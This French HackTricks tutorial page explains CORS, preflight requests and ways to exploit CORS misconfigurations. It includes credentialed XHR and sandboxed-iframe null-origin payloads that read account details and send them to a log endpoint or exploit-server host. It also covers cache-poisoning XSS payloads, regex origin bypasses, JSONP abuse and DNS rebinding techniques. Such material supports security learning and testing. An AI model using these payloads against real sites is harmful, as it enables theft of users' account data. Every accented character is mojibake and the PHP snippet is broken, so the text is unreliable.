# CORS - Mauvaises configurations & Contournement

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Qu'est-ce que CORS ?

La norme CORS (Cross-origin resource sharing) est n√©cessaire car elle **permet aux serveurs de sp√©cifier qui peut acc√©der √† ses ressources** et quelles **m√©thodes de requ√™te HTTP sont autoris√©es** depuis des ressources externes.

Une politique de **m√™me origine** exige que le **serveur demandant** une ressource et le serveur o√π se trouve la **ressource** utilisent le m√™me protocole ([http://),domain](http://\),domain) (internal-web.com) et le m√™me **port** (80). Ainsi, si le serveur impose la politique de m√™me origine, seules les pages web du m√™me domaine et port pourront acc√©der aux ressources.

Le tableau suivant montre comment la politique de m√™me origine sera appliqu√©e dans `http://normal-website.com/example/example.html` :

| URL acc√©d√©e                               | Acc√®s autoris√© ?                   |
| ----------------------------------------- | ---------------------------------- |
| `http://normal-website.com/example/`      | Oui : m√™me sch√©ma, domaine et port |
| `http://normal-website.com/example2/`     | Oui : m√™me sch√©ma, domaine et port |
| `https://normal-website.com/example/`     | Non : sch√©ma et port diff√©rents    |
| `http://en.normal-website.com/example/`   | Non : domaine diff√©rent            |
| `http://www.normal-website.com/example/`  | Non : domaine diff√©rent            |
| `http://normal-website.com:8080/example/` | Non : port diff√©rent\*             |

\*_Internet Explorer autorisera cet acc√®s car IE ne tient pas compte du num√©ro de port lors de l'application de la politique de m√™me origine._

### En-t√™te `Access-Control-Allow-Origin`

La sp√©cification de `Access-Control-Allow-Origin` permet **plusieurs origines**, ou la valeur **`null`**, ou le joker **`*`**. Cependant, **aucun navigateur ne prend en charge plusieurs origines** et il existe des **restrictions** sur l'utilisation du joker **`*`**.(_Le joker ne peut √™tre utilis√© seul, cela √©chouera `Access-Control-Allow-Origin: https://*.normal-website.com` et il ne peut pas √™tre utilis√© avec_ _Access-Control-Allow-Credentials: true_)

Cet en-t√™te est **retourn√© par un serveur** lorsqu'un site web demande une ressource cross-domain, avec un en-t√™te `Origin` ajout√© par le navigateur.

### En-t√™te `Access-Control-Allow-Credentials`

Le comportement **par d√©faut** des requ√™tes de ressources cross-origin est que les **requ√™tes** soient **transmises sans identifiants** comme les cookies et l'en-t√™te d'autorisation. Cependant, le serveur cross-domain peut **permettre la lecture** de la **r√©ponse** lorsque les **identifiants** sont **transmis** en d√©finissant l'en-t√™te CORS **`Access-Control-Allow-Credentials`** √† **`true`**.

Si la valeur est d√©finie sur `true`, alors le navigateur enverra des identifiants (cookies, en-t√™tes d'autorisation ou certificats clients TLS).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### Requ√™te pr√©alable (pre-flight)

Dans certaines circonstances, lorsqu'une requ√™te inter-domaines :

* inclut une **m√©thode HTTP non standard (HEAD, GET, POST)**
* inclut de **nouveaux en-t√™tes**
* inclut une valeur sp√©ciale de l'en-t√™te **Content-Type**

{% hint style="info" %}
**V√©rifiez** [**dans ce lien**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests) **les conditions d'une requ√™te pour √©viter l'envoi d'une requ√™te pr√©alable (pre-flight)**
{% endhint %}

la requ√™te inter-origines est pr√©c√©d√©e par une **requ√™te** utilisant la m√©thode **`OPTIONS`**, et le protocole CORS n√©cessite une v√©rification initiale sur **quelles m√©thodes et quels en-t√™tes sont autoris√©s avant de permettre la requ√™te inter-origines**. Cela s'appelle la **v√©rification pr√©alable (pre-flight check)**. Le serveur **retourne une liste des m√©thodes autoris√©es** en plus de l'**origine de confiance** et le navigateur v√©rifie si la m√©thode du site web demandeur est autoris√©e.

{% hint style="danger" %}
Notez que **m√™me si une requ√™te pr√©alable n'est pas envoy√©e** parce que les conditions de la "requ√™te r√©guli√®re" sont respect√©es, la **r√©ponse doit contenir les en-t√™tes d'autorisation** ou le **navigateur** **ne pourra pas lire la r√©ponse** de la requ√™te.
{% endhint %}

Par **exemple**, voici une requ√™te pr√©alable qui cherche √† **utiliser la m√©thode `PUT`** avec un **en-t√™te** de requ√™te **personnalis√©** appel√© `Special-Request-Header` :
```
OPTIONS /data HTTP/1.1
Host: <some website>
...
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```
Le serveur pourrait renvoyer une r√©ponse comme la suivante :
```
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* `Access-Control-Allow-Headers` En-t√™tes autoris√©s
* `Access-Control-Expose-Headers`
* `Access-Control-Max-Age` D√©finit un d√©lai maximal pour la mise en cache de la r√©ponse de pr√©-vol pour r√©utilisation
* `Access-Control-Request-Headers` L'en-t√™te que la requ√™te cross-origin souhaite envoyer
* `Access-Control-Request-Method` La m√©thode que la requ√™te cross-origin souhaite utiliser
* `Origin` Origine de la requ√™te cross-origin (D√©fini automatiquement par le navigateur)

![](../.gitbook/assets/preflight.svg)

Notez que g√©n√©ralement (selon le content-type et les en-t√™tes d√©finis) dans une **requ√™te GET/POST, aucune requ√™te de pr√©-vol n'est envoy√©e** (la requ√™te est envoy√©e **directement**), mais si vous voulez acc√©der aux **en-t√™tes/corps de la r√©ponse**, elle doit contenir un en-t√™te _Access-Control-Allow-Origin_ qui le permet.\
**Par cons√©quent, CORS ne prot√®ge pas contre les CSRF (mais cela peut √™tre utile).**

### **Requ√™tes de r√©seau local Requ√™te de pr√©-vol**

Lorsqu'une requ√™te est envoy√©e √† une adresse IP de r√©seau local, 2 en-t√™tes CORS suppl√©mentaires sont envoy√©s :

* L'en-t√™te de requ√™te client `Access-Control-Request-Local-Network` indique que la requ√™te est une requ√™te de r√©seau local
* L'en-t√™te de r√©ponse serveur `Access-Control-Allow-Local-Network` indique qu'une ressource peut √™tre partag√©e en toute s√©curit√© avec des r√©seaux externes

Une **r√©ponse valide permettant la requ√™te de r√©seau local** doit √©galement avoir dans la r√©ponse l'en-t√™te `Access-Controls-Allow-Local_network: true` :
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://public.example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Notez que l'adresse IP **0.0.0.0** sous Linux fonctionne pour **contourner** ces exigences pour acc√©der √† localhost car cette adresse IP n'est pas consid√©r√©e comme "locale".

Il est √©galement possible de **contourner les exigences du r√©seau local** si vous utilisez **l'adresse IP publique d'un point de terminaison local** (comme l'adresse IP publique du routeur). Car dans plusieurs occasions, m√™me si l'**adresse IP publique** est acc√©d√©e, si c'est **depuis le r√©seau local**, l'acc√®s sera accord√©.


{% endhint %}

## Configurations exploitables

Remarquez que la plupart des **attaques r√©elles n√©cessitent que `Access-Control-Allow-Credentials`** soit d√©fini sur **`true`** car cela permettra au navigateur d'envoyer les identifiants et de lire la r√©ponse. Sans identifiants, de nombreuses attaques deviennent sans objet ; cela signifie que vous ne pouvez pas utiliser les cookies d'un utilisateur, donc il n'y a souvent rien √† gagner √† faire √©mettre la requ√™te par leur navigateur plut√¥t que de la faire vous-m√™me.

Une exception notable est lorsque **la localisation r√©seau de la victime fonctionne comme une sorte d'authentification.** Vous pouvez utiliser le navigateur d'une victime comme un proxy pour contourner l'authentification bas√©e sur l'IP et acc√©der aux applications de l'intranet. En termes d'impact, cela est similaire au DNS rebinding, mais beaucoup moins compliqu√© √† exploiter.

### `Origin` refl√©t√© dans `Access-Control-Allow-Origin`

Dans le monde r√©el, cela ne peut pas arriver car **ces 2 valeurs des en-t√™tes sont interdites ensemble**.\
Il est √©galement vrai que beaucoup de d√©veloppeurs veulent **permettre plusieurs URL dans le CORS**, mais les jokers de sous-domaines ou les listes d'URL ne sont pas autoris√©s. Ensuite, plusieurs d√©veloppeurs **g√©n√®rent** l'en-t√™te \*\*`Access-Control-Allow-Origin`\*\* **dynamiquement**, et dans plus d'une occasion, ils copient simplement **la valeur de l'en-t√™te Origin**.

Dans ce cas, **la m√™me vuln√©rabilit√© pourrait √™tre exploit√©e.**

Dans d'autres cas, le d√©veloppeur pourrait v√©rifier que le **domaine** (_victimdomain.com_) **appara√Æt** dans l'en-t√™te **Origin**, alors, un attaquant peut utiliser un domaine appel√© **`attackervictimdomain.com`** pour voler les informations confidentielles.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acc21f651fde5631c03665e000d90048.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### L'origine `null`

`null` est une valeur sp√©ciale pour l'en-t√™te **Origin**. La sp√©cification mentionne qu'elle est d√©clench√©e par des redirections et des fichiers HTML locaux. Certaines applications peuvent autoriser l'origine `null` pour soutenir le d√©veloppement local de l'application.\
C'est int√©ressant car **plusieurs applications autoriseront cette valeur** dans le CORS et n'importe quel **site web peut facilement obtenir l'origine null en utilisant un iframe sandbox√©** :
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### **Contournements Regexp**

Si vous avez trouv√© que le domaine _victim.com_ est **autoris√©**, vous devriez v√©rifier si _victim.com.**attacker.com**_ est **√©galement autoris√©**, ou, dans le cas o√π vous pouvez **prendre le contr√¥le d'un sous-domaine**, v√©rifier si _**somesubdomain**.victim.com_ est autoris√©.

### **Contournements Regexp avanc√©s**

La plupart des regex utilis√©es pour identifier le domaine √† l'int√©rieur de la cha√Æne se concentrent sur les caract√®res ASCII alphanum√©riques et `.-`. Ainsi, quelque chose comme `victimdomain.com{.attacker.com` dans l'en-t√™te Origin sera interpr√©t√© par la regexp comme si le domaine √©tait `victimdomain.com` mais le navigateur (dans ce cas Safari supporte ce caract√®re dans le domaine) acc√©dera au domaine `attacker.com`.

Le caract√®re `_` (dans les sous-domaines) est non seulement pris en charge dans Safari, mais aussi dans Chrome et Firefox !

**En utilisant l'un de ces sous-domaines, vous pourriez contourner certaines regex "communes" pour trouver le domaine principal d'une URL.**

**Pour plus d'informations et de param√®tres sur ce contournement, consultez :** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **et** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![](<../.gitbook/assets/image (153).png>)

### Depuis un XSS √† l'int√©rieur d'un sous-domaine

Un m√©canisme de d√©fense que les d√©veloppeurs utilisent contre l'exploitation CORS consiste √† autoriser les domaines qui demandent fr√©quemment l'acc√®s aux informations. Cependant, cela n'est pas enti√®rement s√©curis√©, car si **un seul** des sous-domaines du domaine **autoris√©** est **vuln√©rable** √† d'autres exploits tels que **XSS**, cela peut permettre l'exploitation CORS.

Prenons un exemple, le code suivant montre la configuration qui permet aux sous-domaines de _requester.com_ d'acc√©der aux ressources de _provider.com_.
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com')
{
//Access data
else{ // unauthorized access}
}
```
### **Empoisonnement du cache c√¥t√© serveur**

Si les √©toiles sont align√©es, nous pourrions utiliser l'empoisonnement du cache c√¥t√© serveur via l'injection d'en-t√™te HTTP pour cr√©er une vuln√©rabilit√© [XSS stock√©e](https://portswigger.net/web-security/cross-site-scripting/stored).

Si une application **r√©fl√©chit** l'**en-t√™te Origin** sans m√™me le v√©rifier pour des caract√®res ill√©gaux comme , nous avons effectivement une **vuln√©rabilit√© d'injection d'en-t√™te HTTP contre les utilisateurs d'Internet Explorer et Edge car Internet Explorer et Edge consid√®rent \r (0x0d) comme un terminateur d'en-t√™te HTTP valide** : `GET / HTTP/1.1`\
`Origin: z[0x0d]Content-Type: text/html; charset=UTF-7`

Internet Explorer voit la r√©ponse comme :

`HTTP/1.1 200 OK`\
`Access-Control-Allow-Origin: z`\
`Content-Type: text/html; charset=UTF-7`

Ceci n'est pas directement exploitable car il n'y a aucun moyen pour un attaquant de faire envoyer un tel en-t√™te malform√© par le navigateur web de quelqu'un, mais je peux **fabriquer manuellement cette requ√™te dans Burp Suite et un cache c√¥t√© serveur peut enregistrer la r√©ponse et la servir √† d'autres personnes**. Le payload que j'ai utilis√© changera le jeu de caract√®res de la page en **UTF-7**, qui est notoirement utile pour cr√©er des vuln√©rabilit√©s XSS.

### **Empoisonnement du cache c√¥t√© client**

Vous avez peut-√™tre occasionnellement rencontr√© une page avec [XSS refl√©t√©](https://portswigger.net/web-security/cross-site-scripting/reflected) dans un en-t√™te HTTP personnalis√©. Disons qu'une page web r√©fl√©chit le contenu d'un en-t√™te personnalis√© sans encodage :
```http
GET / HTTP/1.1
Host: example.com
X-User-id: &lt;svg/onload=alert\(1\)&gt;

HTTP/1.1 200 OK
Access-Control-Allow-Origin: \*
Access-Control-Allow-Headers: X-User-id
Content-Type: text/html
...
Invalid user: &lt;svg/onload=alert\(1\)&gt;\
```
Avec CORS, nous pouvons envoyer n'importe quelle valeur dans l'en-t√™te. En soi, **cela est inutile** puisque la r√©ponse contenant notre **JavaScript inject√© ne sera pas rendue**. Cependant, **si Vary: Origin n'a pas √©t√© sp√©cifi√©**, la r√©ponse **peut √™tre stock√©e dans le cache du navigateur et affich√©e directement lorsque le navigateur navigue vers l'URL associ√©e**. J'ai cr√©√© un fiddle pour [tenter cette attaque sur une URL de votre choix](https://jsfiddle.net/3gk8u8wu/3/). Comme cette attaque utilise le cache c√¥t√© client, elle est en fait assez fiable.
```markup
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // beware of mixed content blocking when targeting HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>")
req.send();
</script>
```
## Contournement

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI d√©signe un type de vuln√©rabilit√© qui exploite le fait que, lorsqu'une ressource est incluse en utilisant la balise `script`, la SOP ne s'applique pas, car les scripts doivent pouvoir √™tre inclus de mani√®re trans-domaine. Un attaquant peut donc lire tout ce qui a √©t√© inclus en utilisant la balise `script`.

Cela est particuli√®rement int√©ressant dans le cas de JavaScript dynamique ou JSONP lorsque des informations d'autorit√© ambiante comme les cookies sont utilis√©es pour l'authentification. Les cookies sont inclus lors de la demande d'une ressource depuis un h√¥te diff√©rent. Plugin BurpSuite : [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp)

[**En savoir plus sur les diff√©rents types de XSSI et comment les exploiter ici.**](xssi-cross-site-script-inclusion.md)

Essayez d'ajouter un **param√®tre `callback`** dans la requ√™te. Peut-√™tre que la page a √©t√© pr√©par√©e pour envoyer les donn√©es en tant que JSONP. Dans ce cas, la page renverra les donn√©es avec `Content-Type: application/javascript` ce qui contournera la politique CORS.

![](<../.gitbook/assets/image (229).png>)

### Contournement facile (inutile ?)

Vous pouvez demander √† une application web de faire une requ√™te pour vous et de renvoyer la r√©ponse. Cela contournera le **`Access-Control-Allow-Origin`** mais notez que les **identifiants de la victime finale ne seront pas envoy√©s** car vous serez **en contact avec un domaine diff√©rent** (celui qui fera la requ√™te pour vous).

[**CORS-escape**](https://github.com/shalvah/cors-escape)

CORS-escape fournit un **proxy** qui **transmet** notre **requ√™te** avec ses **en-t√™tes**, et il **falsifie** √©galement l'en-t√™te **Origin** (Origin = **domaine demand√©**). Ainsi, la **politique CORS est contourn√©e**.\
Le code source est [sur Github](https://github.com/shalvah/cors-escape), vous pouvez donc **h√©berger le v√¥tre**.
```javascript
xhr.open("GET", "https://cors-escape.herokuapp.com/https://maximum.blog/@shalvah/posts");
```
[**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape)

Le proxy est un peu comme "transmettre" votre requ√™te, exactement telle que vous l'avez envoy√©e. Nous pourrions r√©soudre cela d'une mani√®re alternative qui implique toujours que quelqu'un d'autre fasse la requ√™te pour vous, mais cette fois, **au lieu de transmettre votre requ√™te, le serveur fait sa propre requ√™te, mais avec les param√®tres que vous avez sp√©cifi√©s.**

### Iframe + Popup Bypass

Vous pouvez **contourner les v√©rifications CORS** telles que `e.origin === window.origin` en **cr√©ant un iframe** et **en ouvrant une nouvelle fen√™tre √† partir de celui-ci**. Plus d'informations sur la page suivante :

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### DNS Rebinding via TTL

![](<../.gitbook/assets/image (108).png>)

En gros, vous faites en sorte que la **victime acc√®de √† votre page**, puis vous changez le **DNS de votre domaine (l'IP)** et vous le faites **pointer** vers la **page web de votre victime**. Vous faites ex√©cuter quelque chose √† votre **victime** (**JS**) lorsque le **TTL est termin√©** afin qu'une nouvelle requ√™te DNS soit effectu√©e et que vous puissiez alors recueillir les informations (comme vous maintiendrez toujours **l'utilisateur dans votre domaine**, il n'enverra **aucun cookie** au serveur de la victime, donc cette option **abuse des privil√®ges sp√©ciaux de l'IP de la victime**).

M√™me si vous d√©finissez le **TTL tr√®s bas** (0 ou 1), les **navigateurs ont un cache** qui vous **emp√™chera d'abuser** de cela pendant plusieurs secondes/minutes.

Ainsi, cette technique est utile pour **contourner les v√©rifications explicites** (la victime effectue **explicitement une requ√™te DNS** pour v√©rifier l'IP du domaine et lorsque le bot est appel√©, il fera sa propre requ√™te).

Ou lorsque vous pouvez avoir un **utilisateur/bot sur la m√™me page pendant longtemps** (afin que vous puissiez **attendre** jusqu'√† ce que le **cache expire**).

Si vous avez besoin de quelque chose de rapide pour abuser de cela, vous pouvez utiliser un service comme [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

Si vous souhaitez ex√©cuter votre propre serveur de rebinding DNS, vous pouvez utiliser quelque chose comme [**DNSrebinder**](https://github.com/mogwailabs/DNSrebinder)**,** puis **exposer** votre **port local 53/udp**, cr√©er un **enregistrement A pointant vers celui-ci** (ns.example.com), et cr√©er un **enregistrement NS** pointant vers le **sous-domaine A pr√©c√©demment cr√©√©**(ns.example.com).\
Ensuite, tout sous-domaine de ce sous-domaine (ns.example.com), sera r√©solu par votre h√¥te.

Consultez √©galement le **serveur public en cours d'ex√©cution sur** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

### DNS Rebinding via **Inondation du Cache DNS**

Comme expliqu√© dans la section pr√©c√©dente, les **navigateurs** conservent les IPs des domaines **en cache plus longtemps** que ce qui est sp√©cifi√© dans le TTL. Cependant, il existe un moyen de contourner cette d√©fense.

Vous pouvez avoir un service worker qui va **inonder le cache DNS pour forcer une seconde requ√™te DNS**. Le flux sera donc le suivant :

1. La requ√™te DNS r√©pond avec l'adresse de l'attaquant
2. Le service worker inonde le cache DNS (le nom du serveur attaquant mis en cache est supprim√©)
3. Une seconde requ√™te DNS r√©pond cette fois avec 127.0.0.1

![](<../.gitbook/assets/image (375) (1).png>)

_Le bleu repr√©sente la premi√®re requ√™te DNS et l'orange repr√©sente l'inondation._

### DNS Rebinding via **Cache**

Comme expliqu√© dans la section pr√©c√©dente, les **navigateurs** conservent les IPs des domaines **en cache plus longtemps** que ce qui est sp√©cifi√© dans le TTL. Cependant, il existe une autre fa√ßon de contourner cette d√©fense.

Vous pouvez **cr√©er 2 enregistrements A** (ou **1 avec 2 IPs**, selon le fournisseur) pour le **m√™me sous-domaine** chez le **fournisseur DNS** et lorsque le navigateur les v√©rifie, il obtiendra les deux.

Maintenant, si le **navigateur** d√©cide d'**utiliser d'abord l'adresse IP de l'attaquant**, l'**attaquant** pourra **servir** le **payload** qui **effectuera des requ√™tes HTTP** vers le m√™me **domaine**. Cependant, maintenant que l'attaquant conna√Æt l'IP de la victime, **il cessera de r√©pondre au navigateur de la victime**.

Lorsque le navigateur constate que le **domaine ne lui r√©pond pas**, il **utilisera la seconde IP donn√©e**, il **acc√©dera donc √† un endroit diff√©rent en contournant la SOP**. L'attaquant peut abuser de cela pour **obtenir les informations et les exfiltrer**.

{% hint style="warning" %}
Notez que pour acc√©der √† localhost, vous devriez essayer de relier **127.0.0.1** sur Windows et **0.0.0.0** sur Linux.\
Des fournisseurs tels que GoDaddy ou Cloudflare ne m'ont pas permis d'utiliser l'IP 0.0.0.0, mais AWS Route 53 m'a permis de cr√©er un enregistrement A avec 2 IPs, l'une d'elles √©tant "0.0.0.0"

<img src="../.gitbook/assets/image (638) (2) (1) (1) (1).png" alt="" data-size="original">
{% endhint %}

![](<../.gitbook/assets/image (620) (4).png>)

Pour plus d'informations, vous pouvez consulter [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)

### Autres Contournements Courants

* Si les **IPs internes ne sont pas autoris√©es**, ils peuvent **oublier d'interdire 0.0.0.0** (fonctionne sur Linux et Mac)
* Si les **IPs internes ne sont pas autoris√©es**, r√©pondez avec un **CNAME** vers **localhost** (fonctionne sur Linux et Mac)
* Si les **IPs internes ne sont pas autoris√©es** comme r√©ponses DNS, vous pouvez r√©pondre avec des **CNAMEs vers des services internes** tels que www.corporate.internal.

### DNS Rebidding Arm√©

Vous pouvez trouver plus d'informations sur les techniques de contournement pr√©c√©dentes et comment utiliser l'outil suivant dans la conf√©rence [Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference](https://www.youtube.com/watch?v=y9-0lICNjOQ).

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) est un outil pour effectuer des attaques de [DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding). Il comprend les composants n√©cessaires pour relier l'adresse IP du nom de domaine du serveur d'attaque √† l'adresse IP de la machine cible et pour servir des payloads d'attaque pour exploiter les logiciels vuln√©rables sur la machine cible.

### Protection R√©elle contre le DNS Rebinding

* Utilisez TLS dans les services internes
* Demandez une authentification pour acc√©der aux donn√©es
* Validez l'en-t√™te Host
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/) : Proposition d'envoyer toujours une requ√™te pr√©alable lorsque les serveurs publics veulent acc√©der aux serveurs internes

## **Outils**

**Fuzz les configurations erron√©es possibles dans les politiques CORS**

* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)

## R√©f√©rences

{% embed url="https://portswigger.net/web-security/cors" %}

{% embed url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS" %}

{% embed url="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" %}

{% embed url="https://www.codecademy.com/articles/what-is-cors" %}

{% embed url="https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors" %}

{% embed url="https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration" %}

{% embed url="https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b" %}

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux repos github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
